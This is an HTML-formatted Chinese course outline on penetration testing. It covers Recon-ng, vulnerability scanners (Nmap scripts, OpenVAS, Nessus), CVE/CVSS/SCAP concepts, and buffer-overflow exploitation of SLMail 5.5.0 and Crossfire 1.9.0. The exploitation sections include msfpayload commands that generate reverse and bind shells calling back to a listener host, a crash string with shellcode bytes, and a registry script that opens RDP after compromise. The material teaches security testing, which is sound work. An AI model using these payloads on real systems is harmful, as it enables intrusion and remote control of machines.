<h4 id="RECON-NG-1"><a href="#RECON-NG-1" class="headerlink" title="RECON-NG"></a>RECON-NG</h4><ul>
<li>Web信息搜索框架</li>
<li>命令格式与msf⼀一致</li>
<li>基于python开发</li>
<li>使⽤用⽅方法：<ul>
<li>模块</li>
<li>数据库</li>
<li>报告</li>
</ul>
</li>
</ul>
<h4 id="RECON-NG-2"><a href="#RECON-NG-2" class="headerlink" title="RECON-NG"></a>RECON-NG</h4><h5 id="•-全局选项"><a href="#•-全局选项" class="headerlink" title="• 全局选项"></a>• 全局选项</h5><ul>
<li>USER-AGENT</li>
<li>Proxy</li>
<li>Workspace</li>
<li>Snapshot</li>
<li>Show schema</li>
<li>Help</li>
<li>Query 数据库</li>
<li>Select * from hosts where host like ‘%baidu.com%’ order by ip_address</li>
</ul>
<h4 id="RECON-NG-3"><a href="#RECON-NG-3" class="headerlink" title="RECON-NG"></a>RECON-NG</h4><h5 id="•-DNS查询"><a href="#•-DNS查询" class="headerlink" title="• DNS查询"></a>• DNS查询</h5><ul>
<li>Google</li>
<li>Baidu</li>
<li>Bing</li>
<li>Ya h o o</li>
<li>Brute force</li>
<li>解析IP地址（查询数据库）</li>
<li>联系⼈人</li>
<li>报告</li>
<li>API</li>
</ul>
<h1 id="Q-amp-A-4"><a href="#Q-amp-A-4" class="headerlink" title="Q &amp; A"></a>Q &amp; A</h1><h1 id="第七章-主动信息收集"><a href="#第七章-主动信息收集" class="headerlink" title="第七章 主动信息收集"></a>第七章 主动信息收集</h1><h1 id="第八章-漏洞扫描"><a href="#第八章-漏洞扫描" class="headerlink" title="第八章 漏洞扫描"></a>第八章 漏洞扫描</h1><h4 id="发现弱点"><a href="#发现弱点" class="headerlink" title="发现弱点"></a>发现弱点</h4><ul>
<li>发现漏洞<ul>
<li>基于端口服务扫描结果版本信息（速度慢）</li>
<li>搜索已公开的漏洞数据库（数量大）</li>
<li>使用弱点扫描器实现漏洞管理</li>
</ul>
</li>
</ul>
<h4 id="从信息的维度定义漏洞管理"><a href="#从信息的维度定义漏洞管理" class="headerlink" title="从信息的维度定义漏洞管理"></a>从信息的维度定义漏洞管理</h4><ul>
<li>信息收集：<ul>
<li>扫描发现网络IP、OS、服务、配置、漏洞</li>
<li>能力需求：定义扫描方式内容和目标</li>
</ul>
</li>
<li>信息管理<ul>
<li>格式化信息，并进行筛选、分组、定义优先级</li>
<li>能力需求：资产分组、指定所有者、向所有者报告漏洞</li>
</ul>
</li>
<li>信息输出<ul>
<li>向不同层级的人群展示足够的信息量</li>
<li>能力需求：生成报告、导出数据、与SIEM集成</li>
</ul>
</li>
</ul>
<h4 id="弱点扫描类型"><a href="#弱点扫描类型" class="headerlink" title="弱点扫描类型"></a>弱点扫描类型</h4><ul>
<li>主动扫描<ul>
<li>有身份验证</li>
<li>无身份验证</li>
</ul>
</li>
<li>被动扫描<ul>
<li>镜像端口抓包</li>
<li>其他来源输入</li>
</ul>
</li>
<li>基于Agent的扫描<ul>
<li>支持平台有限</li>
</ul>
</li>
</ul>
<h4 id="漏洞基本概念"><a href="#漏洞基本概念" class="headerlink" title="漏洞基本概念"></a>漏洞基本概念</h4><ul>
<li>CVSS（Common Vulnerability Scoring System）<ul>
<li>通用漏洞评分系统——工业标准</li>
<li>描述安全漏洞严重程度的统一评分方案</li>
<li>V 3版本—— 2015 年 6 月 10 日</li>
<li>Basic Metric：基础的恒定不变的弱点权重</li>
<li>Temporal Metric：依赖时间因素的弱点权重</li>
<li>Enviromental Metric：利用弱点的环境要求和实施难度的权重</li>
</ul>
</li>
</ul>
<h4 id="漏洞基本概念-1"><a href="#漏洞基本概念-1" class="headerlink" title="漏洞基本概念"></a>漏洞基本概念</h4><ul>
<li>CVSS（Common Vulnerability Scoring System）<ul>
<li>CVSS是安全内容自动化协议（SCAP）的一部分</li>
<li>通常CVSS与CVE一同由美国国家漏洞库（NVD）发布并保持数据的更新</li>
<li>分值范围： 0 —— 10</li>
<li>不同机构按CVSS分值定义威胁的中、高、低威胁级别</li>
<li>CVSS体现弱点的风险，威胁级别（severity）表示弱点风险对企业的影响程度</li>
<li>CVSS分值是工业标准，但威胁级别不是</li>
</ul>
</li>
</ul>
<h4 id="漏洞基本概念-2"><a href="#漏洞基本概念-2" class="headerlink" title="漏洞基本概念"></a>漏洞基本概念</h4><ul>
<li>Vulnerability Reference</li>
<li>CVE（ Common Vulnerabilities and Exposures ）<ul>
<li>已公开的信息安全漏洞字典，统一的漏洞编号标准</li>
<li>MITRE公司负责维护（非盈利机构）</li>
<li>扫描器的大部分扫描项都对应一个CVE编号</li>
<li>实现不同厂商之间信息交换的统一标准</li>
</ul>
</li>
<li>CVE发布流程<ul>
<li>发现漏洞</li>
<li>CAN负责指定CVE ID</li>
<li>发布到CVE List —— CVE- 2008 - 4250</li>
<li>MITRE负责对内容进行编辑维护</li>
</ul>
</li>
</ul>
<h4 id="漏洞基本概念-3"><a href="#漏洞基本概念-3" class="headerlink" title="漏洞基本概念"></a>漏洞基本概念</h4><ul>
<li>很多厂商维护自己的Vulnerability Reference<ul>
<li>MS</li>
<li>MSKB</li>
</ul>
</li>
<li>其他Vulnerability Reference<ul>
<li>CERT TA08-297A</li>
<li>BID 31874</li>
<li>IAVM 2008 - A- 0081</li>
<li>OVAL OVAL</li>
</ul>
</li>
</ul>
<h4 id="漏洞基本概念-4"><a href="#漏洞基本概念-4" class="headerlink" title="漏洞基本概念"></a>漏洞基本概念</h4><ul>
<li>OVAL（Open Vulnerability and Assessment Language）<ul>
<li>描述漏洞检测方法的机器可识别语言</li>
<li>详细的描述漏洞检测的技术细节，可导入自动化检测工具中实施漏洞检测工作</li>
<li>OVAL使用XML语言描述，包含了严密的语法逻辑^</li>
</ul>
</li>
<li>CCE<ul>
<li>描述软件配置缺陷的一种标准化格式</li>
<li>在信息安全风险评估中，配置缺陷的检测是一项重要内容，使用CCE可以让配置缺陷以标准的方式<br> 展现出来，便于配置缺陷评估的可量化操作。</li>
</ul>
</li>
<li>CPE（Common Product Enumeration）<ul>
<li>信息技术产品、系统、软件包的结构化命名规范，分类命名</li>
</ul>
</li>
<li>CWE（Common Weakness Enumeration）<ul>
<li>常见漏洞类型的字典，描述不同类型漏洞的特征（访问控制、信息泄露、拒绝服务）</li>
</ul>
</li>
</ul>
<h4 id="漏洞基本概念-5"><a href="#漏洞基本概念-5" class="headerlink" title="漏洞基本概念"></a>漏洞基本概念</h4><ul>
<li>Security Content Automation Protocol (SCAP)<ul>
<li>SCAP 是一个集合了多种安全标准框架</li>
<li>六个元素：CVE、OVAL、CCE、CPE、 CVSS、XCCDF</li>
<li>目的是以标准的方法展示和操作安全数据</li>
<li>由NIST负责维护</li>
</ul>
</li>
<li>SCAP主要解决三个问题<ul>
<li>实现高层政策法规等到底层实施的落地（如FISMA，ISO27000系列）</li>
<li>将信息安全所涉及的各个要素标准化（如统一漏洞的命名及严重性度量）</li>
<li>将复杂的系统配置核查工作自动化</li>
</ul>
</li>
<li>SCAP是当前美国比较成熟的一套信息安全评估标准体系，其标准化、自动化的思想对信息安</li>
</ul>
<h5 id="全行业产生了深远的影响。"><a href="#全行业产生了深远的影响。" class="headerlink" title="全行业产生了深远的影响。"></a>全行业产生了深远的影响。</h5><h4 id="漏洞基本概念-6"><a href="#漏洞基本概念-6" class="headerlink" title="漏洞基本概念"></a>漏洞基本概念</h4><ul>
<li>NVD（National Vulnerability Database）<ul>
<li>美国政府的漏洞管理标准数据</li>
<li>完全基于SCAP框架</li>
<li>实现自动化漏洞管理、安全测量、合规要求</li>
<li>包含以下库<ul>
<li>安全检查列表</li>
<li>软件安全漏洞</li>
<li>配置错误</li>
<li>产品名称</li>
<li>影响度量</li>
</ul>
</li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://nvd.nist.gov/">https://nvd.nist.gov/</a></li>
</ul>
<h4 id="漏洞管理"><a href="#漏洞管理" class="headerlink" title="漏洞管理"></a>漏洞管理</h4><ul>
<li>周期性扫描跟踪漏洞</li>
<li>高危漏洞优先处理</li>
<li>扫描注意事项</li>
<li>漏洞管理三要素<ul>
<li>准确性</li>
<li>时间</li>
<li>资源</li>
</ul>
</li>
</ul>
<h4 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h4><ul>
<li>nmap 扫描脚本<ul>
<li>400+</li>
<li>分类</li>
</ul>
</li>
<li>cat &#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts&#x2F;script.db</li>
<li>grep vuln &#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts&#x2F;script.db | cut -d “&quot;“ -f 2</li>
<li>cat &#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts&#x2F;smb-check-vulns.nse</li>
<li>smb-check-vulns.nse<ul>
<li>nmap - sU - sS –script&#x3D;smb-check-vulns.nse –script-args&#x3D;unsafe&#x3D;1 -p U:137,T:139,445 1.1.1.1</li>
<li>MS08- 067</li>
</ul>
</li>
</ul>
<h4 id="NMAP-1"><a href="#NMAP-1" class="headerlink" title="NMAP"></a>NMAP</h4><ul>
<li>smb-vuln-ms10- 061 .nse<ul>
<li>Stuxnet蠕虫利用的 4 个漏洞之一</li>
<li>Print Spooler权限不当，打印请求可在系统目录可创建文件、执行任意代码</li>
<li>LANMAN API枚举共享打印机</li>
<li>远程共享打印机名称</li>
<li>smb-enum-shares枚举共享<ul>
<li>身份认证参数——smbuser、smbpassword</li>
<li>nmap - p445 –script&#x3D;smb-enum-shares.nse –script-args&#x3D;smbuser&#x3D;admin,smbpassword&#x3D;pass<br> 1.1.1.1</li>
</ul>
</li>
<li>Windows XP,Server 2003 SP2,Vista,Server 2008, win 7</li>
</ul>
</li>
<li>影响扫描结果的因素</li>
</ul>
<h4 id="扫描结果确认"><a href="#扫描结果确认" class="headerlink" title="扫描结果确认"></a>扫描结果确认</h4><ul>
<li>目标系统版本</li>
<li>补丁是否安装</li>
<li>是否可被入侵</li>
<li>有时很难说什么才是准确的扫描结果</li>
<li>应综合的看待漏洞威胁</li>
</ul>
<h4 id="OPENVAS"><a href="#OPENVAS" class="headerlink" title="OPENVAS"></a>OPENVAS</h4><ul>
<li>Openvas<ul>
<li>Nessus项目分支</li>
<li>管理目标系统的漏洞</li>
<li>免费开源</li>
<li>Kali默认安装，但未配置和启动</li>
</ul>
</li>
</ul>
<h4 id="OPENVAS-1"><a href="#OPENVAS-1" class="headerlink" title="OPENVAS"></a>OPENVAS</h4><h4 id="OPENVAS-2"><a href="#OPENVAS-2" class="headerlink" title="OPENVAS"></a>OPENVAS</h4><ul>
<li>OpenVAS Manager<ul>
<li>控制scanner和其他manager的中心组件</li>
<li>控制中心数据库，保存用户配置及扫描结果</li>
<li>客户端使用基于XML的无状态OMP协议与其通信</li>
<li>集中排序筛选，使客户端获得一致展现</li>
</ul>
</li>
<li>OpenVAS Scanner<ul>
<li>具体执行Network Vulnerability Tests （NVTs）</li>
<li>NVTs 每天通过 Feed 更新</li>
<li>受 Manager 控制</li>
</ul>
</li>
</ul>
<h4 id="OPENVAS-3"><a href="#OPENVAS-3" class="headerlink" title="OPENVAS"></a>OPENVAS</h4><ul>
<li>OSP Scanner<ul>
<li>可以统一管理多个scanner</li>
<li>将一组 scanner 作为一个对象交给manager管理</li>
</ul>
</li>
<li>Greenbone Security Assistant (GSA)<ul>
<li>提供 Web service</li>
</ul>
</li>
<li>OpenVAS CLI<ul>
<li>omp 命令行工具，可实现批处理控制 manager</li>
</ul>
</li>
<li>更新很快<ul>
<li>所有找得到的资料几乎都已不同程度的过时了</li>
</ul>
</li>
</ul>
<h4 id="OPENVAS-4"><a href="#OPENVAS-4" class="headerlink" title="OPENVAS"></a>OPENVAS</h4><ul>
<li>安装</li>
<li>创建证书</li>
<li>同步弱点数据库</li>
<li>创建客户端证书</li>
<li>重建数据库</li>
<li>备份数据库</li>
<li>启动服务装入插件</li>
<li>创建管理员账号</li>
<li>创建普通用户账号</li>
<li>配置服务侦听端口</li>
<li>安装验证</li>
</ul>
<h4 id="OPENVAS-5"><a href="#OPENVAS-5" class="headerlink" title="OPENVAS"></a>OPENVAS</h4><ul>
<li>初始化安装<ul>
<li>openvas-setup</li>
</ul>
</li>
<li>检查安装结果<ul>
<li>openvas-check-setup</li>
</ul>
</li>
<li>查看当前账号<ul>
<li>openvasmd –list-users</li>
</ul>
</li>
<li>修改账号密码<ul>
<li>openvasmd –user&#x3D;admin –new-password&#x3D;Passw0rd</li>
</ul>
</li>
<li>升级<ul>
<li>openvas-feed-update</li>
</ul>
</li>
</ul>
<h4 id="OPENVAS-6"><a href="#OPENVAS-6" class="headerlink" title="OPENVAS"></a>OPENVAS</h4><ul>
<li>不是秘笈是经验</li>
<li>vi &#x2F;usr&#x2F;bin&#x2F;openvas-start<ul>
<li>Starting OpenVas Services</li>
<li>Starting OpenVAS Manager: openvasmd</li>
<li>Starting OpenVAS Scanner: openvassd</li>
<li>Starting Greenbone Security Assistant: gsad</li>
</ul>
</li>
</ul>
<h4 id="OPENVAS-7"><a href="#OPENVAS-7" class="headerlink" title="OPENVAS"></a>OPENVAS</h4><ul>
<li>扫描配置<ul>
<li>扫描windows</li>
<li>扫描Linux</li>
<li>扫描网络设备</li>
</ul>
</li>
</ul>
<h4 id="OPENVAS-8"><a href="#OPENVAS-8" class="headerlink" title="OPENVAS"></a>OPENVAS</h4><ul>
<li>扫描目标<ul>
<li>Windows</li>
<li>Linux</li>
<li>路由器</li>
</ul>
</li>
</ul>
<h4 id="OPENVAS-9"><a href="#OPENVAS-9" class="headerlink" title="OPENVAS"></a>OPENVAS</h4><ul>
<li>扫描任务<ul>
<li>进度</li>
<li>报告</li>
</ul>
</li>
</ul>
<h4 id="NESSUS"><a href="#NESSUS" class="headerlink" title="NESSUS"></a>NESSUS</h4><ul>
<li>家庭版<ul>
<li>免费</li>
</ul>
</li>
<li>专业版<ul>
<li>收费、无限的并发连接</li>
</ul>
</li>
<li>下载<ul>
<li><a target="_blank" rel="noopener" href="http://www.tenable.com/products/nessus/select-your-operating-system">http://www.tenable.com/products/nessus/select-your-operating-system</a></li>
</ul>
</li>
<li>安装<ul>
<li>dpkg – i</li>
<li>安装路径：&#x2F;opt&#x2F;nessus</li>
</ul>
</li>
<li>启动服务<ul>
<li>&#x2F;etc&#x2F;init.d&#x2F;nessusd start</li>
</ul>
</li>
</ul>
<h4 id="NESSUS-1"><a href="#NESSUS-1" class="headerlink" title="NESSUS"></a>NESSUS</h4><ul>
<li>管理地址<ul>
<li><a target="_blank" rel="noopener" href="https://127.0.0.1:8834/">https://127.0.0.1:8834</a></li>
</ul>
</li>
<li>注册激活码<ul>
<li><a target="_blank" rel="noopener" href="http://www.tenable.com/products/nessus-home">http://www.tenable.com/products/nessus-home</a></li>
</ul>
</li>
<li>管理账号<ul>
<li>更新插件</li>
</ul>
</li>
<li>基本配置（setting）<ul>
<li>升级</li>
<li>账号</li>
<li>SMTP</li>
<li>代理</li>
</ul>
</li>
</ul>
<h4 id="NESSUS-2"><a href="#NESSUS-2" class="headerlink" title="NESSUS"></a>NESSUS</h4><ul>
<li>策略</li>
<li>扫描</li>
<li>扫描本机</li>
<li>扫描windows</li>
<li>扫描linux</li>
<li>扫描网络设备</li>
<li>扫描web server</li>
<li>报告</li>
<li>调度</li>
</ul>
<h4 id="NEXPOSE"><a href="#NEXPOSE" class="headerlink" title="NEXPOSE"></a>NEXPOSE</h4><ul>
<li>Rapid 7<ul>
<li>Nexpose</li>
<li>完整的漏洞管理实现</li>
</ul>
</li>
</ul>
<h4 id="扫描结果分析"><a href="#扫描结果分析" class="headerlink" title="扫描结果分析"></a>扫描结果分析</h4><ul>
<li>False positive:<ul>
<li>误报</li>
</ul>
</li>
<li>False negative<ul>
<li>漏报</li>
</ul>
</li>
</ul>
<h1 id="Q-amp-A-5"><a href="#Q-amp-A-5" class="headerlink" title="Q &amp; A"></a>Q &amp; A</h1><h1 id="第九章-缓冲区溢出"><a href="#第九章-缓冲区溢出" class="headerlink" title="第九章 缓冲区溢出"></a>第九章 缓冲区溢出</h1><h4 id="程序漏洞从哪里来"><a href="#程序漏洞从哪里来" class="headerlink" title="程序漏洞从哪里来"></a>程序漏洞从哪里来</h4><h6 id="•-罪恶的根源：变量"><a href="#•-罪恶的根源：变量" class="headerlink" title="• 罪恶的根源：变量"></a>• 罪恶的根源：变量</h6><h6 id="•-数据与代码边界不清"><a href="#•-数据与代码边界不清" class="headerlink" title="• 数据与代码边界不清"></a>• 数据与代码边界不清</h6><ul>
<li>最简漏洞原理 —— shell脚本漏洞</li>
</ul>
<h4 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h4><h6 id="•-当缓冲区边界限制不严格时，由于变量传入畸形数据或程序运行错误，导致缓冲区被“撑"><a href="#•-当缓冲区边界限制不严格时，由于变量传入畸形数据或程序运行错误，导致缓冲区被“撑" class="headerlink" title="• 当缓冲区边界限制不严格时，由于变量传入畸形数据或程序运行错误，导致缓冲区被“撑"></a>• 当缓冲区边界限制不严格时，由于变量传入畸形数据或程序运行错误，导致缓冲区被“撑</h6><h6 id="暴”，从而覆盖了相邻内存区域的数据；"><a href="#暴”，从而覆盖了相邻内存区域的数据；" class="headerlink" title="暴”，从而覆盖了相邻内存区域的数据；"></a>暴”，从而覆盖了相邻内存区域的数据；</h6><h6 id="•-成功修改内存数据，可造成进程劫持，执行恶意代码，获取服务器控制权等后果"><a href="#•-成功修改内存数据，可造成进程劫持，执行恶意代码，获取服务器控制权等后果" class="headerlink" title="• 成功修改内存数据，可造成进程劫持，执行恶意代码，获取服务器控制权等后果"></a>• 成功修改内存数据，可造成进程劫持，执行恶意代码，获取服务器控制权等后果</h6><h4 id="如何发现漏洞"><a href="#如何发现漏洞" class="headerlink" title="如何发现漏洞"></a>如何发现漏洞</h4><h6 id="•-源码审计"><a href="#•-源码审计" class="headerlink" title="• 源码审计"></a>• 源码审计</h6><h6 id="•-逆向工程"><a href="#•-逆向工程" class="headerlink" title="• 逆向工程"></a>• 逆向工程</h6><h6 id="•-模糊测试"><a href="#•-模糊测试" class="headerlink" title="• 模糊测试"></a>• 模糊测试</h6><ul>
<li>向程序堆栈半随机的数据，根据内存变化判断溢出</li>
<li>数据生成器：生成随机、半随机数据</li>
<li>测试工具：识别溢出漏洞</li>
</ul>
<h4 id="WINDOWS-缓冲区溢出"><a href="#WINDOWS-缓冲区溢出" class="headerlink" title="WINDOWS 缓冲区溢出"></a>WINDOWS 缓冲区溢出</h4><h4 id="FUZZER"><a href="#FUZZER" class="headerlink" title="FUZZER"></a>FUZZER</h4><ul>
<li>SLMail 5.5.0 Mail Server</li>
<li>ImmunityDebugger_1_85_setup.exe</li>
<li>mona.py</li>
<li><a target="_blank" rel="noopener" href="http://pan.baidu.com/s/1o6kT6gM">http://pan.baidu.com/s/1o6kT6gM</a></li>
</ul>
<h4 id="FUZZER-1"><a href="#FUZZER-1" class="headerlink" title="FUZZER"></a>FUZZER</h4><ul>
<li>SLMail 5.5.0 Mail Server<ul>
<li>POP3 PASS 命令存在缓冲区溢出漏洞</li>
<li>无需身份验证实现远程代码执行</li>
<li>DEP：阻止代码从数据页被执行</li>
<li>ASLR：随机内存地址加载执行程序和DLL，每次重启地址变化</li>
</ul>
</li>
</ul>
<h4 id="POP"><a href="#POP" class="headerlink" title="POP"></a>POP</h4><ul>
<li>Nc 110 端口</li>
<li>了解未知协议<ul>
<li>Wireshark</li>
<li>RFC</li>
</ul>
</li>
<li>01.py</li>
</ul>
<h4 id="FUZZING"><a href="#FUZZING" class="headerlink" title="FUZZING"></a>FUZZING</h4><h6 id="•-测试-PASS-命令接收到大量数据时是否会溢出"><a href="#•-测试-PASS-命令接收到大量数据时是否会溢出" class="headerlink" title="• 测试 PASS 命令接收到大量数据时是否会溢出"></a>• 测试 PASS 命令接收到大量数据时是否会溢出</h6><h6 id="•-EIP-寄存器存放下一条指令的地址"><a href="#•-EIP-寄存器存放下一条指令的地址" class="headerlink" title="• EIP 寄存器存放下一条指令的地址"></a>• EIP 寄存器存放下一条指令的地址</h6><ul>
<li>02.py</li>
</ul>
<h4 id="FUZZING-1"><a href="#FUZZING-1" class="headerlink" title="FUZZING"></a>FUZZING</h4><h6 id="•-2700-个字符实现-EIP-寄存器溢出"><a href="#•-2700-个字符实现-EIP-寄存器溢出" class="headerlink" title="• 2700 个字符实现 EIP 寄存器溢出"></a>• 2700 个字符实现 EIP 寄存器溢出</h6><ul>
<li>03.py</li>
<li>找到精确溢出的 4 个字节<ul>
<li>二分法</li>
<li>唯一字串法</li>
<li>usr&#x2F;share&#x2F;metasploit-framework&#x2F;tools&#x2F;pattern_create.rb 2700</li>
<li>04.py</li>
<li>05.py</li>
</ul>
</li>
</ul>
<h4 id="FUZZING-2"><a href="#FUZZING-2" class="headerlink" title="FUZZING"></a>FUZZING</h4><h6 id="•-思路："><a href="#•-思路：" class="headerlink" title="• 思路："></a>• 思路：</h6><ul>
<li>将 EIP 修改为shellcode代码的内存地址，将Shellcode写入到该地址空间，程序读取 EIP 寄存器<br>  数值，将跳转到 shellcode 代码段并执行；</li>
<li>寻找可存放shellcode的内存空间</li>
<li>06.py</li>
</ul>
<h4 id="FUZZING-3"><a href="#FUZZING-3" class="headerlink" title="FUZZING"></a>FUZZING</h4><h6 id="•-不同类型的程序、协议、漏洞，会将某些字符认为是坏字符，这些字符有固定用途"><a href="#•-不同类型的程序、协议、漏洞，会将某些字符认为是坏字符，这些字符有固定用途" class="headerlink" title="• 不同类型的程序、协议、漏洞，会将某些字符认为是坏字符，这些字符有固定用途"></a>• 不同类型的程序、协议、漏洞，会将某些字符认为是坏字符，这些字符有固定用途</h6><ul>
<li>返回地址、Shellcode、buffer中都不能出现坏字符</li>
<li>null byte (0x00) 空字符，用于终止字符串的拷贝操作</li>
<li>return (0x0D) 回车操作，表示POP3 PASS 命令输入完成</li>
<li>思路：发送0x00 —— 0xff 256个字符，查找所有坏字符</li>
<li>07.py</li>
<li>0x0A</li>
<li>0x0D</li>
</ul>
<h4 id="FUZZING-4"><a href="#FUZZING-4" class="headerlink" title="FUZZING"></a>FUZZING</h4><h6 id="•-重定向数据流"><a href="#•-重定向数据流" class="headerlink" title="• 重定向数据流"></a>• 重定向数据流</h6><ul>
<li>用 ESP 的地址替换 EIP 的值</li>
<li>但是 ESP 地址变化，硬编码不可行</li>
<li>SLMail 线程应用程序，操作系统为每个线程分配一段地址范围，每个线程地址范围不确定</li>
<li>变通思路</li>
<li>在内存中寻找地址固定的系统模块</li>
<li>在模块中寻找 JMP ESP 指令的地址跳转，再由该指令间接跳转到 ESP，从而执行shellcode</li>
<li>mona.py 脚本识别内存模块，搜索“return address”是JMP ESP指令的模块</li>
<li>寻找无DEP、ALSR保护的内存地址</li>
<li>内存地址不包含坏字符</li>
</ul>
<h4 id="FUZZING-5"><a href="#FUZZING-5" class="headerlink" title="FUZZING"></a>FUZZING</h4><h6 id="•-寻找不受保护的系统模块"><a href="#•-寻找不受保护的系统模块" class="headerlink" title="• 寻找不受保护的系统模块"></a>• 寻找不受保护的系统模块</h6><ul>
<li>!mona modules</li>
<li>将汇编指令 jmp esp 转换为二进制</li>
<li>.&#x2F;nasm_shell</li>
<li>FFE</li>
<li>在模块中搜索 FFE4 指令</li>
<li>!mona find -s “\xff\xe4” -m slmfc.dll</li>
<li>选择不包含坏字符的内存地址</li>
<li>在该地址设置断点</li>
<li>重发buffer</li>
<li>08.py （地址全翻转）</li>
</ul>
<h4 id="FUZZING-6"><a href="#FUZZING-6" class="headerlink" title="FUZZING"></a>FUZZING</h4><ul>
<li>生成shellcode</li>
<li>Scratch</li>
<li>.&#x2F;msfpayload -l</li>
<li>.&#x2F;msfpayload win32_reverse LHOST&#x3D;192.168.20.8 LPORT&#x3D;443 C</li>
<li>.&#x2F;msfpayload win32_reverse LHOST&#x3D;192.168.20.8 LPORT&#x3D;443 R | .&#x2F;msfencode - b<br>  “\x00\x0a\x0d”</li>
<li>nc - vlp 443</li>
<li>09.py</li>
</ul>
<h4 id="FUZZING-7"><a href="#FUZZING-7" class="headerlink" title="FUZZING"></a>FUZZING</h4><ul>
<li>Shellcode执行结束后以 ExitProcess 方式退出整个进程，将导致邮件服务崩溃；</li>
<li>Slmail是一个基于线程的应用，适用ExitThread方式可以避免整个服务崩溃，可实现重复溢出；</li>
<li>.&#x2F;msfpayload win32_reverse LHOST&#x3D;192.168.20.8 EXITFUNC&#x3D;thread LPORT&#x3D;443 R<br>  | .&#x2F;msfencode - b “\x00\x0a\x0d”</li>
</ul>
<h4 id="FUZZING-8"><a href="#FUZZING-8" class="headerlink" title="FUZZING"></a>FUZZING</h4><ul>
<li>echo Windows Registry Editor Version 5.00&gt;3389.reg<br>  echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal<br>  Server]&gt;&gt;3389.reg<br>  echo “fDenyTSConnections”&#x3D;dword:00000000&gt;&gt;3389.reg<br>  echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal<br>  Server\Wds\rdpwd\Tds\tcp]&gt;&gt;3389.reg<br>  echo “PortNumber”&#x3D;dword:00000d3d&gt;&gt;3389.reg<br>  echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal<br>  Server\WinStations\RDP-Tcp]&gt;&gt;3389.reg<br>  echo “PortNumber”&#x3D;dword:00000d3d&gt;&gt;3389.reg<br>  regedit &#x2F;s 3389.reg</li>
</ul>
<h4 id="LINUX-缓冲区溢出"><a href="#LINUX-缓冲区溢出" class="headerlink" title="LINUX 缓冲区溢出"></a>LINUX 缓冲区溢出</h4><h4 id="FUZZING-9"><a href="#FUZZING-9" class="headerlink" title="FUZZING"></a>FUZZING</h4><ul>
<li>Crossfire<ul>
<li>多人在线 RPG 游戏</li>
<li>1.9.0 版本接受入站 socket 连接时存在缓冲区溢出漏洞</li>
</ul>
</li>
<li>调试工具<ul>
<li>edb</li>
</ul>
</li>
<li>运行平台<ul>
<li>Kali i486 虚拟机</li>
</ul>
</li>
</ul>
<h4 id="FUZZING-10"><a href="#FUZZING-10" class="headerlink" title="FUZZING"></a>FUZZING</h4><ul>
<li>新版本Linux内核支持内存保护机制<ul>
<li>DEP</li>
<li>ASLR</li>
<li>堆栈 cookies</li>
<li>堆栈粉碎</li>
</ul>
</li>
</ul>
<h4 id="FUZZING-11"><a href="#FUZZING-11" class="headerlink" title="FUZZING"></a>FUZZING</h4><ul>
<li>本机调试<ul>
<li>iptables -A INPUT -p tcp –destination-port 4444 ! -d 127.0.0.1 -j DROP</li>
<li>iptables -A INPUT -p tcp –destination-port 13327 ! -d 127.0.0.1 -j DROP</li>
</ul>
</li>
</ul>
<h4 id="FUZZING-12"><a href="#FUZZING-12" class="headerlink" title="FUZZING"></a>FUZZING</h4><ul>
<li>解压<ul>
<li>&#x2F;usr&#x2F;games</li>
<li>tar zxpf crossfire.tar.gz</li>
</ul>
</li>
<li>调试<ul>
<li>edb –run &#x2F;usr&#x2F;games&#x2F;crossfire&#x2F;bin&#x2F;crossfire</li>
<li>01.py</li>
</ul>
</li>
</ul>
<h4 id="FUZZING-13"><a href="#FUZZING-13" class="headerlink" title="FUZZING"></a>FUZZING</h4><ul>
<li>唯一字符串识别 EIP 精确位置<ul>
<li>&#x2F;usr&#x2F;share&#x2F;metasploit-‐framework&#x2F;tools&#x2F;pattern_create.rb 4379</li>
<li>02.py</li>
<li>&#x2F;usr&#x2F;share&#x2F;metasploit-‐framework&#x2F;tools&#x2F;pattern_offset.rb 46367046</li>
<li>4368</li>
</ul>
</li>
<li>03.py</li>
</ul>
<h4 id="FUZZING-14"><a href="#FUZZING-14" class="headerlink" title="FUZZING"></a>FUZZING</h4><ul>
<li>思路：</li>
<li>第一阶段shellcode<ul>
<li>ESP 跳转到 EAX</li>
<li>偏移 12 个字节</li>
</ul>
</li>
<li>setup sound shellcode2</li>
<li>&#x2F;usr&#x2F;share&#x2F;metasploit-‐framework&#x2F;tools&#x2F;nasm_shell.rb<ul>
<li>add eax,12</li>
<li>jmp eax</li>
<li>\x83\xc0\x0c\xff\xe0\x90\x90</li>
</ul>
</li>
</ul>
<h4 id="FUZZING-15"><a href="#FUZZING-15" class="headerlink" title="FUZZING"></a>FUZZING</h4><ul>
<li>查找坏字符<ul>
<li>\x00\x0a\x0d\x20</li>
</ul>
</li>
</ul>
<h4 id="FUZZING-16"><a href="#FUZZING-16" class="headerlink" title="FUZZING"></a>FUZZING</h4><ul>
<li>ESP 跳转地址<ul>
<li>Opcode serach</li>
<li>crash &#x3D; “\x41“ * 4368 + “\x97\x45\x13\x08“ + “\x83\xc0\x0c\xff\xe0\x90\x90”</li>
</ul>
</li>
<li>设断点（0x08134597）<ul>
<li>EIP—— 08134597</li>
<li>jmp esp</li>
<li>add eax, 12</li>
<li>jmp eax</li>
</ul>
</li>
</ul>
<h4 id="FUZZING-17"><a href="#FUZZING-17" class="headerlink" title="FUZZING"></a>FUZZING</h4><ul>
<li>msfpayload linux&#x2F;x86&#x2F;shell_bind_tcp LPORT&#x3D;4444 R | msfencode - b</li>
</ul>
<h5 id="“-x00-x0a-x0d-x20”"><a href="#“-x00-x0a-x0d-x20”" class="headerlink" title="“\x00\x0a\x0d\x20”"></a>“\x00\x0a\x0d\x20”</h5><ul>
<li>05.py</li>
</ul>
<h4 id="选择和修改-EXP"><a href="#选择和修改-EXP" class="headerlink" title="选择和修改 EXP"></a>选择和修改 EXP</h4><ul>
<li>网上公开的 EXP 代码<ul>
<li>选择可信赖的 EXP 源</li>
<li>Exploit-db</li>
<li>SecurityFocus</li>
<li>Searchsploit</li>
<li>有能力修改 EXP（Python、Perl、Ruby、C、C++…）</li>
